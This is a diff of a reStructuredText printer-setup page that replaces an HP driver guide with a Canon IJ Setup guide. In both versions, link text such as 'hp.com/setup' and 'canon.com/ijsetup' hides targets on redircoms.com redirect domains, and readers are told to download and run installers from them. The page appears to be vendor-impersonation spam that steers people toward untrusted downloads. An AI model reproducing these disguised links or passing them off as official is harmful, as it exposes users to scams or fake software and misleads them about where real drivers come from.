@@ -1,21 +1,21 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+Step by Step Guide to Set Up Your Canon Printer Using IJ Setup
 ##################
 
 .. meta::
-   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
+   :msvalidate.01: FAC645F7A6F0C987881BDC96B99921F8
 
 .. image:: blank.png
       :width: 350px
       :align: center
       :height: 100px
 
-.. image:: Enter_Product_Key.png
+.. image:: SETUP-YOUR-PRINTER.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: canon.com/ijsetup
+      :target: https://can.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,46 +28,46 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+Download `Canon IJ Setup <https://can.redircoms.com>`_ software and run the installer. Connect your printer to Wi-Fi, select your network, and enter the password. Follow the prompts to install drivers and complete the setup. Once installed, test your printer to ensure it's working correctly and is wirelessly connected to your network.
 
-**********
-Steps to Download HP Printer Driver
-**********
+Step-by-Step Guide
+------------------
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+1. **Power On the Printer:**  
+   Ensure your Canon printer is turned on and in a ready state.
 
-2. Enter your HP printer model in the search box.
+2. **Enable Wireless Capability:**  
+   Make sure the printer’s Wi-Fi feature is enabled (usually via the control panel or settings menu).
 
-3. Select your operating system if prompted.
+3. **Visit Setup Page:**  
+   Go to `canon.com/ijsetup <https://can.redircoms.com>`_ in your web browser and search for your printer model.
 
-4. Click on **Download** to get the latest driver and software package.
+4. **Download Setup Software:**  
+   Download the `Canon IJ Setup <https://can.redircoms.com>`_ software that matches your operating system (Windows or macOS).
 
-5. Save the installer file to your computer.
+5. **Run Installer:**  
+   Locate and open the downloaded file, then follow the on-screen instructions.
 
-**********
-Steps to Install HP Printer Driver
-**********
+6. **Agree to Terms:**  
+   Accept the license agreement and select the location where you'd like to install the software.
 
-1. Locate the downloaded installer file on your computer.
+7. **Connect to Wi-Fi Network:**  
+   Choose your Wi-Fi network from the list displayed during setup.
 
-2. Double-click the installer to begin the setup process.
+8. **Enter Wi-Fi Password:**  
+   Input your network security key (WEP/WPA/WPA2) if prompted.
 
-3. Follow the on-screen instructions and accept the license agreement.
+9. **Wait for Connection:**  
+   Allow the printer to establish a wireless connection with your network.
 
-4. Choose your connection type (USB or Wireless).
+10. **Install Drivers and Software:**  
+    Continue following the prompts to install all necessary drivers and utilities.
 
-5. Complete the installation by clicking **Finish**.
+11. **Finish Installation:**  
+    Wait for the setup to complete.
 
-**********
-Setting Up Your HP Printer
-**********
+12. **Print Test Page:**  
+    Print a test page to confirm successful setup and wireless connectivity.
 
-1. Make sure your HP printer is powered on.
-
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
-
-3. Open the HP driver or utility you installed.
-
-4. Follow on-screen prompts to detect and connect your printer.
-
-5. Once connected, print a test page to verify setup is complete.
+13. **Ready to Use:**  
+    Once setup is complete, your Canon printer is ready for wireless printing of documents and photos.
